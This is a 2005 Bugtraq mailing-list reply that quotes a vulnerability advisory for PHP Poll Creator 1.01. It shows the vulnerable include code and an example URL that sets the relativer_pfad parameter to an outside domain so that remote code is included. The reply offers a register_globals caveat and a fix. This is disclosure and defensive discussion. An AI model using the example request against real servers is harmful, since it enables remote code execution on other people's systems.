
Date: Thu, 26 May 2005 18:41:45 +1000
From: Michael Cordover <michael.cordover@...il.com>
To: bugtraq@...urityfocus.com
Cc: rash ilusion <torash@...il.com>
Subject: Re: PHP Injection in PHP Poll Creator


Hi,

It should be noted that this only occurs where register_globals is set
to on in php.ini or using php_flag in a .htaccess file which is
currently not the default value.  Thus the vulnrability is not major.

Despite this, it is poor coding practice.  Suggested fix is inserting,
before that line:

if (!empty($_REQUEST['relativer_pfad'])) {
  unset($relativer_pfad);
}

It should furthermore be noted that URL wrapped files which are
included using include() are NOT parsed using PHP, rather their output
is passed as raw HTML.  This can still present an XSS-like attack,
however.

Regards,

Michael Cordover

On 25 May 2005 05:16:31 -0000, rash ilusion <torash@...il.com> wrote:
> 
> 
> svadvisory#6
> -------------------------------------------------------------+
>     Title: PHP Injection in PHP Poll Creator                 |
>  Software: PHP Poll Creator v 1.01                           |
>  Homepage: http://www.phppc.de                  +------------+
>    Finder: rash                                 |  24.05.05  |
> -------------------------------------------------------------+
> 
> Description
> -------------------------------------------------------------|
> 
> Vulnerability has been found in file poll_vote.php
> 
> <?php
> include $relativer_pfad . "config.inc.php";
> include ($relativer_pfad . "lib/functions.inc.php");
> ....
> ?>
> 
> one can implement any php code, what we need are it, a delivery
> the variable $relativer_pfad over URL, with which defintion our
> address to our file with php the code this file must absolutely
> config.inc.php is designated, otherwise cannot it not function
> where one this file put down are it no matter, main thing one
> give the exact address to the file config.inc.php with php the
> code to where them are.
> 
> Example
> -------------------------------------------------------------|
> 
> poll_vote.php?relativer_pfad=http://domain.tld/dir/
> 
> 
> Conclusion
> -------------------------------------------------------------|
> 
> as I understood it, this is not any longer developed further
> script program, but I go of it out of that, all versions am
> concerned, but without guarantee.
> 
> #############################################################
> 
> rash || Search Vulnerabilities Team || www.svt.nukleon.us
> 


-- 
http://mine.mjec.net/


